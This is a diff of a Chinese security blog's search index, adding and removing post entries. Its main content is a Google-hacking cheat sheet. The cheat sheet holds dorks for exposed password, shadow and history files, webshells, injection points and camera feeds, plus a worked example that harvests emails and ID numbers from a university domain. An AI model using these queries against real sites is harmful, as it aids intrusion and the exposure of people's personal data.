@@ -1,6 +1,47 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>信息收集之Google Hack语法</title>
+    <url>/post/26e13bb5/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001基础语法："><a href="#0x001基础语法：" class="headerlink" title="0x001基础语法："></a>0x001基础语法：</h2><h3 id="1-语法说明："><a href="#1-语法说明：" class="headerlink" title="1.语法说明："></a>1.语法说明：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">inurl: 在url地址栏中显示的信息页面</span><br><span class="line">intext: 显示在正文信息中的内容页面</span><br><span class="line">site: 限制显示你某个域名的所有页面</span><br><span class="line">filetype: 搜索文件的后缀或者扩展名</span><br><span class="line">intitle: 限制你搜索的网页标题页面</span><br><span class="line">link: 将显示有到指定网页的链接的网页</span><br><span class="line">cache:将显示在Google cache中的网页</span><br><span class="line">allintitle: 搜索所有关键字构成标题的网页.（allintite:关键字或者url地址）</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-操作符说明："><a href="#2-操作符说明：" class="headerlink" title="2.操作符说明："></a>2.操作符说明：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"> +把google可能忽略的字列如查询范围 </span><br><span class="line"> -把某个字忽略</span><br><span class="line">~ 同意词</span><br><span class="line">. 单一的通配符</span><br><span class="line"> *通配符，可代表多个字母</span><br><span class="line"> &quot;&quot; 精确查询</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x002-filetype的使用"><a href="#0x002-filetype的使用" class="headerlink" title="0x002 filetype的使用"></a>0x002 filetype的使用</h2><h3 id="1-查找管理后台："><a href="#1-查找管理后台：" class="headerlink" title="1.查找管理后台："></a>1.查找管理后台：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intext:管理 或 intext:后台 或 intext:登陆  </span><br><span class="line">filety的使用（和site联用）</span><br><span class="line">login|logon  //搜索后台登录</span><br><span class="line">error|warning  //错误信息</span><br><span class="line">username|userid|ID  //后台登录</span><br><span class="line">password|passcode  //后台登录</span><br><span class="line">admin|administrator  //后台登录</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-查找文件类型"><a href="#2-查找文件类型" class="headerlink" title="2.查找文件类型:"></a>2.查找文件类型:</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">filetype:doc </span><br><span class="line">filetype:.doc site:.mil classified   //直接搜索军方相关word</span><br><span class="line">filetype:xml </span><br><span class="line">filetype:rar </span><br><span class="line">filetype:docx </span><br><span class="line">filetype:inc  </span><br><span class="line">filetype:mdb </span><br><span class="line">filetype:txt</span><br><span class="line">filetype:emali </span><br><span class="line">filetype:xls </span><br><span class="line">filetype:.sql</span><br><span class="line">filetype:inc </span><br><span class="line">filetype:conf</span><br><span class="line">filetype:txt</span><br><span class="line">filetye:xml</span><br><span class="line">filetyep:pdf</span><br><span class="line">学生信息 fitepy:xlsl</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-查看网站支持的脚本"><a href="#3-查看网站支持的脚本" class="headerlink" title="3.查看网站支持的脚本"></a>3.查看网站支持的脚本</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">filetype:asp</span><br><span class="line">filetype:jsp </span><br><span class="line">filetyp:php </span><br><span class="line">filetype:ASPX</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x003-intitle的使用"><a href="#0x003-intitle的使用" class="headerlink" title="0x003 intitle的使用"></a>0x003 intitle的使用</h2><h3 id="1-搜索铭感信息泄露"><a href="#1-搜索铭感信息泄露" class="headerlink" title="1.搜索铭感信息泄露"></a>1.搜索铭感信息泄露</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intitle:&quot;index of&quot; etc</span><br><span class="line">intitle:&quot;Index of&quot; .sh_history</span><br><span class="line">intitle:&quot;Index of&quot; .bash_history</span><br><span class="line">intitle:&quot;index of&quot; passwd</span><br><span class="line">intitle:&quot;index of&quot; people.lst</span><br><span class="line">intitle:&quot;index of&quot; pwd.db</span><br><span class="line">intitle:&quot;index of&quot; etc/shadow</span><br><span class="line">intitle:&quot;index of&quot; spwd</span><br><span class="line">intitle:&quot;index of&quot; master.passwd</span><br><span class="line">intitle:&quot;index of&quot; htpasswd</span><br><span class="line">intitle:&quot;index of&quot; admin</span><br><span class="line">inurl:service.pwd</span><br><span class="line">intitle:phpmyadmin intext:Create new database  //搜索phpmyadmin直接进入后台</span><br><span class="line">intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php//批量搜索webshell</span><br><span class="line">intitle:&quot;index of&quot; data   //列出data目录</span><br><span class="line">intilte:&quot;error occurred&quot; ODBC request where (select|insert)  //搜索sql注入出错页面</span><br><span class="line">intitle:index.of filetype:log   //搜索日志文件</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-查找管理后台"><a href="#2-查找管理后台" class="headerlink" title="2.查找管理后台"></a>2.查找管理后台</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intitle:管理</span><br><span class="line">intitle:登录 </span><br><span class="line">intitle:后台</span><br><span class="line">intitel:&quot;后台登录&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-查找警告错误信息"><a href="#3-查找警告错误信息" class="headerlink" title="3.查找警告错误信息"></a>3.查找警告错误信息</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intile:error</span><br><span class="line">intitle:warning</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x004-inurl的用法"><a href="#0x004-inurl的用法" class="headerlink" title="0x004 inurl的用法"></a>0x004 inurl的用法</h2><h3 id="1-inurl中的管理后台路径"><a href="#1-inurl中的管理后台路径" class="headerlink" title="1.inurl中的管理后台路径"></a>1.inurl中的管理后台路径</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">如：inurl:admin/manager</span><br><span class="line">admin</span><br><span class="line">admin_index</span><br><span class="line">admin_admin</span><br><span class="line">index_admin</span><br><span class="line">admin/index</span><br><span class="line">admin/default</span><br><span class="line">admin/manage</span><br><span class="line">admin/login</span><br><span class="line">manage_index</span><br><span class="line">index_manage</span><br><span class="line">manager/login</span><br><span class="line">manager/login.asp</span><br><span class="line">manager/admin.asp</span><br><span class="line">login/admin/admin.asp</span><br><span class="line">houtai/admin.asp</span><br><span class="line">guanli/admin.asp</span><br><span class="line">denglu/admin.asp</span><br><span class="line">admin_login/admin.asp</span><br><span class="line">admin_login/login.asp</span><br><span class="line">admin/manage/admin.asp</span><br><span class="line">admin/manage/login.asp</span><br><span class="line">admin/default/admin.asp</span><br><span class="line">admin/default/login.asp</span><br><span class="line">member/admin.asp</span><br><span class="line">member/login.asp</span><br><span class="line">administrator/admin.asp</span><br><span class="line">administrator/login.asp</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-inurl中的数据库和配置文件"><a href="#2-inurl中的数据库和配置文件" class="headerlink" title="2.inurl中的数据库和配置文件"></a>2.inurl中的数据库和配置文件</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">inurl:editor/db/</span><br><span class="line">inurl:eWebEditor/db/</span><br><span class="line">inurl:bbs/data/</span><br><span class="line">inurl:databackup/</span><br><span class="line">inurl:blog/data/</span><br><span class="line">inurl:okedata</span><br><span class="line">inurl:bbs/database/</span><br><span class="line">inurl:conn.asp</span><br><span class="line">inurl:inc/conn.asp</span><br><span class="line">inurl:&quot;viewerframe?mode=&quot;//搜索摄像头地址</span><br><span class="line">inurl:db </span><br><span class="line">inurl:mdb</span><br><span class="line">inurl:config.txt </span><br><span class="line">inurl:bash_history</span><br><span class="line">inurl:data filetype:mdb   //搜索mdb格式数据库</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-inurl中的搜索备份文件"><a href="#3-inurl中的搜索备份文件" class="headerlink" title="3.inurl中的搜索备份文件"></a>3.inurl中的搜索备份文件</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">inurl:temp</span><br><span class="line">inurl:tmp</span><br><span class="line">inurl:backup </span><br><span class="line">inurl:bak</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-inurl中查找注入点"><a href="#4-inurl中查找注入点" class="headerlink" title="4.inurl中查找注入点"></a>4.inurl中查找注入点</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">site:xx.com filetype:asp</span><br><span class="line">site:tw inurl:asp?id=   //这个是找台湾的</span><br><span class="line">site:jp inurl:php?id=  // 这个是找日本的</span><br><span class="line">site:ko inurl:jsp?id=  // 这个是找韩国的</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-inurl之上传漏洞："><a href="#4-inurl之上传漏洞：" class="headerlink" title="4.inurl之上传漏洞："></a>4.inurl之上传漏洞：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">site:xx.com inurl:file</span><br><span class="line">site:xx.com inurl:load</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x005-index-of使用"><a href="#0x005-index-of使用" class="headerlink" title="0x005 index of使用"></a>0x005 index of使用</h2><h3 id="1-目标遍历漏洞"><a href="#1-目标遍历漏洞" class="headerlink" title="1.目标遍历漏洞"></a>1.目标遍历漏洞</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Index of /admin</span><br><span class="line">Index of /passwd</span><br><span class="line">Index of /password</span><br><span class="line">Index of /mail</span><br><span class="line">&quot;Index of /&quot; +passwd</span><br><span class="line">&quot;Index of /&quot; +password.txt</span><br><span class="line">&quot;Index of /&quot; +.htaccess</span><br><span class="line">&quot;Index of /secret&quot;</span><br><span class="line">&quot;Index of /confidential&quot;</span><br><span class="line">&quot;Index of /root&quot;</span><br><span class="line">&quot;Index of /cgi-bin&quot;</span><br><span class="line">&quot;Index of /credit-card&quot;</span><br><span class="line">&quot;Index of /logs&quot;</span><br><span class="line">&quot;Index of /config&quot;</span><br><span class="line">“indexof/”inurl:lib //搜索图书馆一般目录遍历下载</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-突破下载文件和任意文件下载"><a href="#2-突破下载文件和任意文件下载" class="headerlink" title="2.突破下载文件和任意文件下载"></a>2.突破下载文件和任意文件下载</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"> &quot;indexof/&quot;ppt   </span><br><span class="line">&quot;indexof/&quot;mp3  </span><br><span class="line"> &quot;indexof/&quot;word </span><br><span class="line"> &quot;indexof/&quot;xls   </span><br><span class="line">&quot;indexof/&quot;swf 等</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x005-实例googel语法入侵"><a href="#0x005-实例googel语法入侵" class="headerlink" title="0x005 实例googel语法入侵"></a>0x005 实例googel语法入侵</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1.site: scu.edu.cn&#x2F;&#x2F;得出该主域名下的所有其他子域名或者页面信息&#96;</span><br><span class="line">如：http:&#x2F;&#x2F;a1.xxxx.com</span><br><span class="line">http:&#x2F;&#x2F;a2.xxxx.com</span><br><span class="line">http:&#x2F;&#x2F;a3.xxxx.com</span><br><span class="line">http:&#x2F;&#x2F;a4.xxxx.com</span><br><span class="line"> 2.找各个子域名的管理后台：&#96;</span><br><span class="line">site: a1.xxxx.com  intitle:管理   或者后台 或者登陆等关键字</span><br><span class="line">site:a1.xxxx.com  inurl:login 或者inurl:admin  可以跟常用的后台路径</span><br><span class="line">site:a1.xxxx.com intext:管理   或者后台   或者登陆等关键字</span><br><span class="line">这里我们得到2个后台管理地址：</span><br><span class="line">http:&#x2F;&#x2F;a2.xxxx.com&#x2F;sys&#x2F;admin_login.asp</span><br><span class="line">http:&#x2F;&#x2F;a3.xxxx.com:88&#x2F;_admin&#x2F;login_in.asp</span><br><span class="line"> 3.查看各个子域名网站服务器跑的脚步对应的程序：&#96;</span><br><span class="line">site:a1.xxxx.com filetype:jsp</span><br><span class="line">site：a1.xxxx.com filetype:aspx</span><br><span class="line">site:a1.xxxx.com filetype:php</span><br><span class="line">site:al.xxxx.com filetype:asp</span><br><span class="line">从上面我们看到该子域名上跑有一个php的后台和一个asp的留言系统</span><br><span class="line"> 4.查找上传路径地址：&#96;</span><br><span class="line">site:a2.xxxx.com inurl:file</span><br><span class="line">site:a3.xxxx.com inurl:load</span><br><span class="line">site:a4.xxx.com inurl:file</span><br><span class="line"> 5.查找铭感信息&#96;</span><br><span class="line">site: scu.edu.cn   intext:*@ scu.edu.cn   查找所有的邮箱地址</span><br><span class="line">site:xxxx.com intext:电话查找所有电话</span><br><span class="line">site:xxxx.com intext:身份证  查找所有身份证</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>信息收集</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>FTP漏洞利用</title>
     <url>/post/1ad5be0d/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0x00-FTP协议介绍"><a href="#0x00-FTP协议介绍" class="headerlink" title="0x00 FTP协议介绍"></a>0x00 FTP协议介绍</h1><p>文件传输协议（FIle Transfer Protocol）是用于在五楼上进行文件传输的一套标准协议，默认端口为21。它属于网络传输协议的应用层。</p>
@@ -60,45 +101,27 @@
       </tags>
   </entry>
   <entry>
-    <title>信息收集之Google Hack语法</title>
-    <url>/post/26e13bb5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="0x001基础语法："><a href="#0x001基础语法：" class="headerlink" title="0x001基础语法："></a>0x001基础语法：</h2><h3 id="1-语法说明："><a href="#1-语法说明：" class="headerlink" title="1.语法说明："></a>1.语法说明：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">inurl: 在url地址栏中显示的信息页面</span><br><span class="line">intext: 显示在正文信息中的内容页面</span><br><span class="line">site: 限制显示你某个域名的所有页面</span><br><span class="line">filetype: 搜索文件的后缀或者扩展名</span><br><span class="line">intitle: 限制你搜索的网页标题页面</span><br><span class="line">link: 将显示有到指定网页的链接的网页</span><br><span class="line">cache:将显示在Google cache中的网页</span><br><span class="line">allintitle: 搜索所有关键字构成标题的网页.（allintite:关键字或者url地址）</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-操作符说明："><a href="#2-操作符说明：" class="headerlink" title="2.操作符说明："></a>2.操作符说明：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"> +把google可能忽略的字列如查询范围 </span><br><span class="line"> -把某个字忽略</span><br><span class="line">~ 同意词</span><br><span class="line">. 单一的通配符</span><br><span class="line"> *通配符，可代表多个字母</span><br><span class="line"> &quot;&quot; 精确查询</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x002-filetype的使用"><a href="#0x002-filetype的使用" class="headerlink" title="0x002 filetype的使用"></a>0x002 filetype的使用</h2><h3 id="1-查找管理后台："><a href="#1-查找管理后台：" class="headerlink" title="1.查找管理后台："></a>1.查找管理后台：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intext:管理 或 intext:后台 或 intext:登陆  </span><br><span class="line">filety的使用（和site联用）</span><br><span class="line">login|logon  //搜索后台登录</span><br><span class="line">error|warning  //错误信息</span><br><span class="line">username|userid|ID  //后台登录</span><br><span class="line">password|passcode  //后台登录</span><br><span class="line">admin|administrator  //后台登录</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-查找文件类型"><a href="#2-查找文件类型" class="headerlink" title="2.查找文件类型:"></a>2.查找文件类型:</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">filetype:doc </span><br><span class="line">filetype:.doc site:.mil classified   //直接搜索军方相关word</span><br><span class="line">filetype:xml </span><br><span class="line">filetype:rar </span><br><span class="line">filetype:docx </span><br><span class="line">filetype:inc  </span><br><span class="line">filetype:mdb </span><br><span class="line">filetype:txt</span><br><span class="line">filetype:emali </span><br><span class="line">filetype:xls </span><br><span class="line">filetype:.sql</span><br><span class="line">filetype:inc </span><br><span class="line">filetype:conf</span><br><span class="line">filetype:txt</span><br><span class="line">filetye:xml</span><br><span class="line">filetyep:pdf</span><br><span class="line">学生信息 fitepy:xlsl</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-查看网站支持的脚本"><a href="#3-查看网站支持的脚本" class="headerlink" title="3.查看网站支持的脚本"></a>3.查看网站支持的脚本</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">filetype:asp</span><br><span class="line">filetype:jsp </span><br><span class="line">filetyp:php </span><br><span class="line">filetype:ASPX</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x003-intitle的使用"><a href="#0x003-intitle的使用" class="headerlink" title="0x003 intitle的使用"></a>0x003 intitle的使用</h2><h3 id="1-搜索铭感信息泄露"><a href="#1-搜索铭感信息泄露" class="headerlink" title="1.搜索铭感信息泄露"></a>1.搜索铭感信息泄露</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intitle:&quot;index of&quot; etc</span><br><span class="line">intitle:&quot;Index of&quot; .sh_history</span><br><span class="line">intitle:&quot;Index of&quot; .bash_history</span><br><span class="line">intitle:&quot;index of&quot; passwd</span><br><span class="line">intitle:&quot;index of&quot; people.lst</span><br><span class="line">intitle:&quot;index of&quot; pwd.db</span><br><span class="line">intitle:&quot;index of&quot; etc/shadow</span><br><span class="line">intitle:&quot;index of&quot; spwd</span><br><span class="line">intitle:&quot;index of&quot; master.passwd</span><br><span class="line">intitle:&quot;index of&quot; htpasswd</span><br><span class="line">intitle:&quot;index of&quot; admin</span><br><span class="line">inurl:service.pwd</span><br><span class="line">intitle:phpmyadmin intext:Create new database  //搜索phpmyadmin直接进入后台</span><br><span class="line">intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php//批量搜索webshell</span><br><span class="line">intitle:&quot;index of&quot; data   //列出data目录</span><br><span class="line">intilte:&quot;error occurred&quot; ODBC request where (select|insert)  //搜索sql注入出错页面</span><br><span class="line">intitle:index.of filetype:log   //搜索日志文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-查找管理后台"><a href="#2-查找管理后台" class="headerlink" title="2.查找管理后台"></a>2.查找管理后台</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intitle:管理</span><br><span class="line">intitle:登录 </span><br><span class="line">intitle:后台</span><br><span class="line">intitel:&quot;后台登录&quot;</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-查找警告错误信息"><a href="#3-查找警告错误信息" class="headerlink" title="3.查找警告错误信息"></a>3.查找警告错误信息</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">intile:error</span><br><span class="line">intitle:warning</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x004-inurl的用法"><a href="#0x004-inurl的用法" class="headerlink" title="0x004 inurl的用法"></a>0x004 inurl的用法</h2><h3 id="1-inurl中的管理后台路径"><a href="#1-inurl中的管理后台路径" class="headerlink" title="1.inurl中的管理后台路径"></a>1.inurl中的管理后台路径</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">如：inurl:admin/manager</span><br><span class="line">admin</span><br><span class="line">admin_index</span><br><span class="line">admin_admin</span><br><span class="line">index_admin</span><br><span class="line">admin/index</span><br><span class="line">admin/default</span><br><span class="line">admin/manage</span><br><span class="line">admin/login</span><br><span class="line">manage_index</span><br><span class="line">index_manage</span><br><span class="line">manager/login</span><br><span class="line">manager/login.asp</span><br><span class="line">manager/admin.asp</span><br><span class="line">login/admin/admin.asp</span><br><span class="line">houtai/admin.asp</span><br><span class="line">guanli/admin.asp</span><br><span class="line">denglu/admin.asp</span><br><span class="line">admin_login/admin.asp</span><br><span class="line">admin_login/login.asp</span><br><span class="line">admin/manage/admin.asp</span><br><span class="line">admin/manage/login.asp</span><br><span class="line">admin/default/admin.asp</span><br><span class="line">admin/default/login.asp</span><br><span class="line">member/admin.asp</span><br><span class="line">member/login.asp</span><br><span class="line">administrator/admin.asp</span><br><span class="line">administrator/login.asp</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-inurl中的数据库和配置文件"><a href="#2-inurl中的数据库和配置文件" class="headerlink" title="2.inurl中的数据库和配置文件"></a>2.inurl中的数据库和配置文件</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">inurl:editor/db/</span><br><span class="line">inurl:eWebEditor/db/</span><br><span class="line">inurl:bbs/data/</span><br><span class="line">inurl:databackup/</span><br><span class="line">inurl:blog/data/</span><br><span class="line">inurl:okedata</span><br><span class="line">inurl:bbs/database/</span><br><span class="line">inurl:conn.asp</span><br><span class="line">inurl:inc/conn.asp</span><br><span class="line">inurl:&quot;viewerframe?mode=&quot;//搜索摄像头地址</span><br><span class="line">inurl:db </span><br><span class="line">inurl:mdb</span><br><span class="line">inurl:config.txt </span><br><span class="line">inurl:bash_history</span><br><span class="line">inurl:data filetype:mdb   //搜索mdb格式数据库</span><br></pre></td></tr></table></figure>
-
-<h3 id="3-inurl中的搜索备份文件"><a href="#3-inurl中的搜索备份文件" class="headerlink" title="3.inurl中的搜索备份文件"></a>3.inurl中的搜索备份文件</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">inurl:temp</span><br><span class="line">inurl:tmp</span><br><span class="line">inurl:backup </span><br><span class="line">inurl:bak</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-inurl中查找注入点"><a href="#4-inurl中查找注入点" class="headerlink" title="4.inurl中查找注入点"></a>4.inurl中查找注入点</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">site:xx.com filetype:asp</span><br><span class="line">site:tw inurl:asp?id=   //这个是找台湾的</span><br><span class="line">site:jp inurl:php?id=  // 这个是找日本的</span><br><span class="line">site:ko inurl:jsp?id=  // 这个是找韩国的</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-inurl之上传漏洞："><a href="#4-inurl之上传漏洞：" class="headerlink" title="4.inurl之上传漏洞："></a>4.inurl之上传漏洞：</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">site:xx.com inurl:file</span><br><span class="line">site:xx.com inurl:load</span><br></pre></td></tr></table></figure>
-
-<h2 id="0x005-index-of使用"><a href="#0x005-index-of使用" class="headerlink" title="0x005 index of使用"></a>0x005 index of使用</h2><h3 id="1-目标遍历漏洞"><a href="#1-目标遍历漏洞" class="headerlink" title="1.目标遍历漏洞"></a>1.目标遍历漏洞</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Index of /admin</span><br><span class="line">Index of /passwd</span><br><span class="line">Index of /password</span><br><span class="line">Index of /mail</span><br><span class="line">&quot;Index of /&quot; +passwd</span><br><span class="line">&quot;Index of /&quot; +password.txt</span><br><span class="line">&quot;Index of /&quot; +.htaccess</span><br><span class="line">&quot;Index of /secret&quot;</span><br><span class="line">&quot;Index of /confidential&quot;</span><br><span class="line">&quot;Index of /root&quot;</span><br><span class="line">&quot;Index of /cgi-bin&quot;</span><br><span class="line">&quot;Index of /credit-card&quot;</span><br><span class="line">&quot;Index of /logs&quot;</span><br><span class="line">&quot;Index of /config&quot;</span><br><span class="line">“indexof/”inurl:lib //搜索图书馆一般目录遍历下载</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-突破下载文件和任意文件下载"><a href="#2-突破下载文件和任意文件下载" class="headerlink" title="2.突破下载文件和任意文件下载"></a>2.突破下载文件和任意文件下载</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line"> &quot;indexof/&quot;ppt   </span><br><span class="line">&quot;indexof/&quot;mp3  </span><br><span class="line"> &quot;indexof/&quot;word </span><br><span class="line"> &quot;indexof/&quot;xls   </span><br><span class="line">&quot;indexof/&quot;swf 等</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x005-实例googel语法入侵"><a href="#0x005-实例googel语法入侵" class="headerlink" title="0x005 实例googel语法入侵"></a>0x005 实例googel语法入侵</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 1.site: scu.edu.cn&#x2F;&#x2F;得出该主域名下的所有其他子域名或者页面信息&#96;</span><br><span class="line">如：http:&#x2F;&#x2F;a1.xxxx.com</span><br><span class="line">http:&#x2F;&#x2F;a2.xxxx.com</span><br><span class="line">http:&#x2F;&#x2F;a3.xxxx.com</span><br><span class="line">http:&#x2F;&#x2F;a4.xxxx.com</span><br><span class="line"> 2.找各个子域名的管理后台：&#96;</span><br><span class="line">site: a1.xxxx.com  intitle:管理   或者后台 或者登陆等关键字</span><br><span class="line">site:a1.xxxx.com  inurl:login 或者inurl:admin  可以跟常用的后台路径</span><br><span class="line">site:a1.xxxx.com intext:管理   或者后台   或者登陆等关键字</span><br><span class="line">这里我们得到2个后台管理地址：</span><br><span class="line">http:&#x2F;&#x2F;a2.xxxx.com&#x2F;sys&#x2F;admin_login.asp</span><br><span class="line">http:&#x2F;&#x2F;a3.xxxx.com:88&#x2F;_admin&#x2F;login_in.asp</span><br><span class="line"> 3.查看各个子域名网站服务器跑的脚步对应的程序：&#96;</span><br><span class="line">site:a1.xxxx.com filetype:jsp</span><br><span class="line">site：a1.xxxx.com filetype:aspx</span><br><span class="line">site:a1.xxxx.com filetype:php</span><br><span class="line">site:al.xxxx.com filetype:asp</span><br><span class="line">从上面我们看到该子域名上跑有一个php的后台和一个asp的留言系统</span><br><span class="line"> 4.查找上传路径地址：&#96;</span><br><span class="line">site:a2.xxxx.com inurl:file</span><br><span class="line">site:a3.xxxx.com inurl:load</span><br><span class="line">site:a4.xxx.com inurl:file</span><br><span class="line"> 5.查找铭感信息&#96;</span><br><span class="line">site: scu.edu.cn   intext:*@ scu.edu.cn   查找所有的邮箱地址</span><br><span class="line">site:xxxx.com intext:电话查找所有电话</span><br><span class="line">site:xxxx.com intext:身份证  查找所有身份证</span><br></pre></td></tr></table></figure>]]></content>
+    <title>everything 信息泄露</title>
+    <url>/post/39581507/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="everything"><a href="#everything" class="headerlink" title="everything"></a>everything</h1><p>用于快速搜索文件，文件夹。</p>
+<h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><p>当电脑处在公网IP，everything HTTP服务配置不当时导致信息泄露。配置不当指http服务器未设置密码等。<br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03vtSJ.png" alt="imgname"></p>
+<h1 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h1><p>allintitle: Everything C:\Windows<br>inurl:Diagnostics/index<br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03xXgH.png" alt="imgname"><br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03xzDI.png" alt="03xzDI.png"><br><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/10/03/03xxKA.png" alt="03xxKA.png"></p>
+<h1 id="安全配置"><a href="#安全配置" class="headerlink" title="安全配置"></a>安全配置</h1><ol>
+<li>关闭http服务</li>
+<li>更换较为复杂账号密码及端口</li>
+</ol>
+]]></content>
       <categories>
-        <category>渗透测试</category>
+        <category>网络安全</category>
       </categories>
       <tags>
-        <tag>信息收集</tag>
+        <tag>信息泄露</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Win10漏洞&quot;永恒之黑&quot; Getshell</title>
+    <url>/post/a0575700/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
   </entry>
   <entry>
     <title>2020 VMware16 15 14 13 12 11 10下载激活</title>
@@ -122,11 +145,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Win10漏洞&quot;永恒之黑&quot; Getshell</title>
-    <url>/post/a0575700/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
-  </entry>
-  <entry>
     <title>爱安全-价值1800的无线WLAN攻防教程</title>
     <url>/post/d0056290/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>无线WLAN攻防课程<br><a href="https://s1.ax1x.com/2020/08/15/dkdz8S.gif"><img src= "https://s1.ax1x.com/2020/08/17/dm2dns.gif" data-lazy-src="https://s1.ax1x.com/2020/08/15/dkdz8S.gif" alt="img"></a><br>加Q群702861483联系群主领取资料<br>【网络安全技术讨论群】：<a href="https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC">https://jq.qq.com/?_wv=1027&amp;k=pCPYYQIC</a></p>
@@ -137,6 +155,19 @@
       <tags>
         <tag>网安学习资源</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>关于本博客</title>
+    <url>/post/4a17b156/</url>
